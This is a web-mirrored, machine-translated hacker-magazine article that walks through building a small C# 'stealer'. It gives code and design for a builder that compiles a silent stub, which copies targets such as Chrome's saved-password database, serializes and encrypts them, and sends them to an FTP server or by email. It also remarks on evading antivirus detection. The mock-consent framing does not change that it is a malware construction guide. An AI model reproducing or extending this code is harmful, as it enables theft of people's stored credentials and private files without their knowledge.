<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Stealer on C #. We did it in 9 KB executable file</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="There is such a class of programs designed to receive specific (or whatever) files from the user and send them to specially authorized people. Of cour...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Stealer on C #. We did it in 9 KB executable file</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/736/f2b/9bf/736f2b9bf01e40d2b1a19e062afeae0e.jpg"><br><br>  There is such a class of programs designed to receive specific (or whatever) files from the user and send them to specially authorized people.  Of course, with the prior written consent of the users mentioned!  This class of programs is called Stealer.  The brightest representative of them, UFR Stealer has a nice interface, a lot of settings and, due to some kind of misunderstanding, is detected by all known antiviruses.  And what would happen if hackers wrote similar programs in C #?  Let's fantasize! <br><a name="habracut"></a><br>  For starters, brace yourself and finally upgrade to free Visual Studio Community 2013 :).  In the yard in 2015, and sit on the old Visual Studio Express is no longer cool.  When you install it, look at the Extensions and updates section and install several useful extensions, such as Resharper or Productivity Power Tools 2013. A free <a href="https://www.jetbrains.com/decompiler/">dotPeek</a> decompiler is quite suitable for analyzing the resulting builds. and a file with debugging symbols. <br><br><blockquote><h4>  Briefly about the program </h4><br><ul><li>  Able to take specified files, encrypt and send to FTP or email. </li><li>  Written using the 22nd pattern of the GOF catalog ‚ÄúTemplate Method‚Äù, it is very easy to expand the range of items for shipment.  At the exit exe 9 kb. </li><li>  Only the builder himself can open the received container (serialized &lt;Name, Data&gt; dictionary), decrypt and remove the saved files. </li><li>  The key is hardcore. </li><li>  The icon does not ask, it does not run from the Aver. </li></ul></blockquote><br><h2>  We set tasks and define requirements. </h2><br>  So, let's try to guess how hackers think at this stage.  For them, the problem is that the user has files that are of interest not only to him.  Perhaps the user does not even know that they exist and where they are precisely located, but this does not make it easier for hackers.  We must somehow get a copy of them and see what is inside - who knows, maybe this is exactly what you need? 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      In order not to disturb the user by their actions, not to interrupt his serials and not to interfere with social networking, hackers add certain functionality to their programs.  Their programs are small and silently do their work (silent mode).  The target platform for today usually choose Windows 7 and higher versions.  XP is a good thing, but it is losing ground, and, according to one well-known anti-virus developer, its share at the end of 2015 will be only 16-17%. <br><br><h2>  We design and construct </h2><br><img src="https://habrastorage.org/files/4ce/c36/05d/4cec3605da1a4a8c9774ba6589aadf19.gif"><br>  Solution Explorer <br><br>  On TV they say that hackers always sit at computers in masks and gloves :).  So that they are not so hot to program, let's set the task: the program must be really small.  Both by the number of lines of code, and by the size of the executable file.  So, in Visual Studio we create a new window application and define several namespaces (namespace): <br><ul><li>  Stealer - logic and interface; </li><li>  Stealer.Targets - files that will be the target of the program; </li><li>  Stealer.STUB - actually stub; </li><li>  Stealer.Extension - extending methods (one will be required). </li></ul><br>  It is necessary not to be confused about which class is where to invest and, accordingly, where to look for it then.  Actually there will not be so many classes themselves, basically these are various implementations of the AbstractFile abstraction (the 22nd pattern from the GOF ‚ÄúTemplate method‚Äù).  Here is his code: <br><br><pre><code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">Stealer.Targets</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">abstract</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">AbstractFile</span></span> { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">byte</span></span></span><span class="hljs-function">[] </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">DoJob</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> IsExist() ? GetFile() : <span class="hljs-literal"><span class="hljs-literal">null</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">abstract</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">bool</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">IsExist</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">abstract</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">byte</span></span></span><span class="hljs-function">[] </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetFile</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>; } }</code> </pre> <br>  The main idea of ‚Äã‚Äãthis class is to form the structure of the algorithm, which will already be implemented in Google Chrome, ICQ, Skype and so on. <br><br>  Yes, a small addition.  In this example, the application logic is inside the Form shared class, if you want to additionally implement a console or WPF interface, you should take it out separately and subscribe to the group of expected events.  More information about the correct architecture can be found in Steve McConnell (Code complete). <br><br><h4>  Interface </h4><br><img src="https://habrastorage.org/files/1e0/2ed/aba/1e02edabad3743aea8eee6d034bbd4b3.gif"><br>  Mainform <br><br>  On the window created in the designer, the menu, three combo boxes, two buttons, six textboxes with labels and eleven checkboxes are snapped up.  The approximate grouping and arrangement of these elements is shown in the picture.  The style of the window is set to ‚Äúdialogue‚Äù so that it cannot be expanded to full screen.  Icon to taste, the network has archives with thousands of copies for every taste.  The subscription will be implemented for three events, namely, clicking on the button Check all, BUILD and the menu item "&amp; OpenFile ...".  At this the design of the visual part of the application ends, moving on. <br><br>  The code under the buttons could be quite trivial, but, as they say, it was not there.  Excerpt from BUILD: <br><br><pre> <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> replaceAdd = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> replaceClass = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> checkedBoxes = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.AllControls&lt;CheckBox&gt;().Where(c =&gt; !c.Text.Contains(<span class="hljs-string"><span class="hljs-string">"-"</span></span>)).Where(c =&gt; c.Checked); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> (CheckBox checkBox <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> checkedBoxes) { <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> className = checkBox.Text; replaceAdd.AppendLine(<span class="hljs-keyword"><span class="hljs-keyword">string</span></span>.Format(<span class="hljs-string"><span class="hljs-string">@"_filesList.Add(new {0}());"</span></span>, className)); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> item = GetResource(<span class="hljs-keyword"><span class="hljs-keyword">string</span></span>.Format(<span class="hljs-string"><span class="hljs-string">@"Stealer.Targets.{0}.cs"</span></span>, className)); replaceClass.AppendLine(CutTheClass(item)); } stub.Replace(<span class="hljs-string"><span class="hljs-string">@"//[Add_toList]"</span></span>, replaceAdd.ToString()); stub.Replace(<span class="hljs-string"><span class="hljs-string">@"//[Class]"</span></span>, replaceClass.ToString());</code> </pre><br>  Using standard tools, you can go through the collection of active checkboxes, but why is it so easy to write when there are beautiful solutions on the Stack Overflow pages?  This explains the appearance of an additional namespace for the peep extension method, where it is located (on the advice of Trey Nash in Accelerated C # 2010).  The key to this decision is also that all classes that implement abstraction are nested application resources (hereinafter shown how to do this) and have the same name as the text on the checkboxes.  Therefore, all you need to do is run through all the active elements and collect their names, simultaneously adding to the collection and replacing the label in the stub class, // [Add_toList] to add to the List and // [Class] to determine the classes themselves.  The FTP address, password, login and data for the mail are implemented as standard - received text from the control and inserted it into a stub. <br><br>  Getting the resources themselves is as follows.  An instance of var assembly = Assembly.GetExecutingAssembly () is created, and the Stream stream = assembly.GetManifestResourceStream (resourceName) reads the data to the end and returns a string of text.  The variable resourceName has the value @ "Stealer.STUB.Stub.cs" which corresponds to the full path to the location of the specified file.  Similarly, we work with other elements of the solution, in the code this line looks like this: "@" Stealer.Targets. {0} .cs ", className", where className is the name of the class and the text on the checkbox. <br><br>  The task of the Check all button is to control checkmarks for all purposes at once.  This is implemented through the private field of the Form class of a boolean type and one method that takes this value as an argument, applying it to each checkbox.  The event handler reads the value of the specified field and is passed to the method; upon its completion, it changes to the opposite. <br><br>  Go to the "&amp; OpenFile ...".  Here you will have to run a little ahead, before reading I recommend to familiarize yourself with the section "Stub".  The code in this handler is organized in the standard way, OpenFileDialog opens and receives the full file name (containing the path), reads it in the FileStream and copies it into the MemoryStream so that you can decode the bytes.  As a result, we have the source stream, which must be deserialized (Deserialize) into the dictionary created in the stub Dictionary &lt;string, byte []&gt;.  It turns out that the object was transferred over the network, which retained its state.  The advantages are that it works well, you do not need to use the archiving code, and only the hacker or his friends reversers will be able to read the intermediate result.  This is followed by the preservation of the dictionary contained in the operative memory on the HDD, here the line that sets the file name is useful.  Implemented this action through foreach by ‚ÄúKeyValuePair &lt;string, byte []&gt; item in _files‚Äù, in the body of the loop there are two lines: the first ‚Äústring filePath = string.Format (folderPath + @" \ {0} ", item.Key) ; "And ends its entry with" File.WriteAllBytes (filePath, item.Value); ".  Everything is laconic and beautiful. <br><br><h4>  Stub </h4><br>  This is the class that will be compiled into a separate executable assembly using an instance of CSharpCodeProvider and the CompileAssemblyFromSource method.  In order for it to become available for reading in runtime, you need to specify Build Action = Embedded Resource in its parameters (F4), and in a line below Do not copy.  To prevent the studio from swearing at the two Main methods, Startup object = Stealer.Program is specified in the project settings, this is for the case when the ‚ÄúStab‚Äù class is not a resource and you can analyze the code for errors.  Now let's look at the sample code. <br><br><pre> <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">Stealer.STUB</span></span> ... <span class="hljs-title"><span class="hljs-title">public</span></span> <span class="hljs-title"><span class="hljs-title">class</span></span> <span class="hljs-title"><span class="hljs-title">Stub</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> List&lt;AbstractFile&gt; _filesList = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> List&lt;AbstractFile&gt;(); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Main</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] args</span></span></span><span class="hljs-function">)</span></span> { DoJob(); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">DoJob</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-comment"><span class="hljs-comment">//[Add_toList] Dictionary&lt;string, byte[]&gt; _files = new Dictionary&lt;string, byte[]&gt;(); foreach (AbstractFile targetFile in _filesList) { var data = targetFile.DoJob(); if (data != null) { _files.Add(targetFile.ToString(), data); } } using (MemoryStream memoryStream = new MemoryStream()) { BinaryFormatter formatter = new BinaryFormatter(); formatter.Serialize(memoryStream, _files); byte[] encodedBytes = Encrypt(memoryStream.ToArray()); if (_sendViaFtp) { SendViaFtp(encodedBytes); } if (_sendViaEmail) { SendViaEmail(encodedBytes); } } } } //[Class]</span></span></code> </pre><br>  First of all, you should pay attention to the fact that all the main work is performed using the generalized List collection and abstraction.  All elements of the collection apkastiyutsya to an abstract class, and on their copies of the method called DoJob, which checks whether the desired file, and, if the answer is yes, he tries to get it.  Next, each received file is placed in the Dictionary &lt;string, byte []&gt; collection, which stores the name of the program containing the file, and the data itself as an array of bytes.  After traversing the entire List collection and filling the Dictionary, the latter is serialized, then encrypted, and finally sent via the specified communication channel. <br><br>  The listing does not display the SendViaFtp and SendViaEmail methods, examples of which will be shown below, the Encrypt method (in fact, the specific implementation does not matter, any symmetric algorithm is chosen), the AbstractFile class and class fields that will store logins, passwords and encryption.  That's all, nothing more interesting and new in the stub is not. <br><br><h4>  File Acquisition Algorithm </h4><br>  Thanks to the Template Method pattern, it became very easy to design classes for searching and retrieving files, you can add dozens of new ones, and you will not need to make any changes to the code using them, that is, stub.  The caller doesn‚Äôt care what and how is implemented inside, this business is called abstracting execution options.  For example, let's look at the implementation of the GoogleChrome class, from the name of which you can guess what it should find and copy. <br><br><pre> <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">Stealer.Targets</span></span> ... <span class="hljs-title"><span class="hljs-title">class</span></span> <span class="hljs-title"><span class="hljs-title">GoogleChrome</span></span> : <span class="hljs-title"><span class="hljs-title">AbstractFile</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> _path = <span class="hljs-literal"><span class="hljs-literal">null</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">override</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">bool</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">IsExist</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> userNamePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); _path = <span class="hljs-keyword"><span class="hljs-keyword">string</span></span>.Format(<span class="hljs-string"><span class="hljs-string">@"{0}\Google\Chrome\User Data\Default\Login Data"</span></span>, userNamePath); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> File.Exists(_path); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">override</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">byte</span></span></span><span class="hljs-function">[] </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetFile</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> pathCopy = Path.GetTempPath() + Path.GetRandomFileName(); File.Copy(_path, pathCopy); <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] data = File.ReadAllBytes(pathCopy); File.Delete(pathCopy); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> data; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">override</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">string</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ToString</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"GoogleChrome"</span></span>; } }</code> </pre><br>  The ToString method is redefined to make the stub dictionary easier to fill in and analyze upon receipt.  Other file search classes look identical, the only difference is in the path and, possibly, additional checks depending on the type of storage.  In order not to forget which methods need to be implemented from the inherited class, or simply to shorten the time of keyboard input, you can click the AbstractFile with the mouse and wait for the promise to implement an abstract class, which automatically builds the necessary code. <br><br><blockquote><h4>  No programming </h4><br>  To find out how much you can add in the program without much effort and how to save a lot of time on personal research, the hacker helps <a href="http://securityxploded.com/passwordsecrets.php">Password Secrets of Popular Windows Applications</a> , it carefully laid out information about the location of files of interest and utilities for analysis. </blockquote><br><h4>  File Algorithm </h4><br><img src="https://habrastorage.org/files/777/a9b/cbb/777a9bcbb8aa4d619de373e309ea57aa.gif"><br>  Sendviaftp <br><br>  As can be seen in the picture of the main form of the application, this part will discuss the example of the implementation of sending via FTP and email.  Let's start with the first.  In the FtpWebRequest constructor, a URL is set from the textbox of the main form that was inserted into its label in the stub.  The name of the transferred file is also added to it, which is used as Environment.UserName in conjunction with Path.GetRandomFileName.  This is done to ensure that users with the same name do not overwrite each other.  The transport method is set in the WebRequestMethods.Ftp.UploadFile, and is specified by NetworkCredential (_ftpUser, _ftpPass) by analogy with the URL.  The efficiency of the method is checked on local FTP, for this smallftpd 1.0.3 was used. <br><br><img src="https://habrastorage.org/files/292/e5b/e0e/292e5be0e0544ceeb8d09f47e89fdc37.gif"><br>  Sendviaemail <br><br>  At first, there were some problems with the mail, and all because of changes in the connection rules (for more information, read here: <a href="http://habrahabr.ru/post/237899/">‚ÄúUsing SmtpClient to send mail through an SMTP server‚Äù</a> ).  The formation of the letter begins with an attachment, and since the array of bytes is passed to the method for sending, the Attachment constructor waits for the MemoryStream, we translate it into the MemoryStream at the beginning of the method, using the using directive.  The file name is set in the same way as FTP.  In the MailMessage message itself, the From, Subject, Body, Sender, To properties are initialized, and the Attachments.Add (attachment) call completes the baton, adding the created attachment.  This is followed by an instance of SmtpClient, which is filled similarly to the message.  Finally, the string smtpClient.Send (mail);  sends the generated letter to the mail server. <br><br><h2>  Conclusion </h2><br>  Today, we fantasized about how a C # Stealer might look like, looked at its possible internal structure and its goals.  I note that during the experiments, my antivirus began to give an alarm only when the Encrypt method was added, before the program could send a file via FTP anywhere.  With the advent of the mailing option, the name of the defined "Malvari" changed to "Trojan" ... but about how hackers struggle with this, read in previous releases] [in the article about cryptors :). <br><br><blockquote><h4>  DVD </h4><br>  Sortsy project are waiting for you on dvd.xakep.ru.  In order not to overly please scripts and not to annoy the servants of the law, they are not compiled directly.  We'll have to fix some minimal errors.  So all sins are on your conscience! </blockquote><br><img src="https://habrastorage.org/getpro/habr/post_images/7a8/146/7e0/7a81467e0c7a59782054603aeec3c678.jpg" alt="image"><br><br>  <i>First published in the magazine "Hacker" from 02/2015.</i> <i><br></i>  <i>Posted by: Dywar, mrdywar@gmail.com</i> <br><br>  Subscribe to "Hacker" <br><ul><li>  <a href="http://bit.ly/habr_subscribe_paper">Paper version</a> </li><li>  <a href="http://bit.ly/xakep_on_ipad">Hacker on iOS / iPad</a> </li><li>  <a href="http://bit.ly/habr_android">"Hacker" on Android</a> </li></ul></div><p>Source: <a href="https://habr.com/ru/post/244467/">https://habr.com/ru/post/244467/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../244451/index.html">Resources for learning Wolfram Language (Mathematica) in Russian</a></li>
<li><a href="../244455/index.html">We write a simple encyclopedia on the Slim Framework</a></li>
<li><a href="../244457/index.html">Modifying the source code of an android application using an apk file</a></li>
<li><a href="../244461/index.html">Research of virtual servers with SSD disks</a></li>
<li><a href="../244465/index.html">AccountLogic 1.0</a></li>
<li><a href="../244471/index.html">Winners of the Tizen App Challenge</a></li>
<li><a href="../244473/index.html">Are there any alternatives in SEO for motivated traffic and the behavioral metrics of the site?</a></li>
<li><a href="../244475/index.html">RTKLib - GPS / GLONASS centimeter accuracy in post-processing</a></li>
<li><a href="../244477/index.html">Web on pure java. Learn Vaadin - a cool web application framework</a></li>
<li><a href="../244479/index.html">Funny bugs</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>